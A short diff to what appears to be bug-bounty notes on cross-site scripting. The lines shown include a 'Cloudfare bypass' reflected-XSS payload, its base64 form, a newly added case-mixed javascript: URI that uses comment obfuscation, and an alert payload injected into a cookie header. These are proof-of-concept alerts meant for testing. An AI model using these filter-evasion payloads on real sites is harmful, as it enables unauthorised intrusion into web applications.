@@ -722,8 +722,9 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 15- Cloudfare bypass rxss payload :
 
 	<ScRiPt >confirm(1)</ScRiPt> [❌Blocked]
-	
+
 	PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg==
+	=javascripT:alert(document/**/.domain)
 16- using intruder search for xss payloads and put them into intruder and try to open every link and see
 17- headers: 
 	Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"
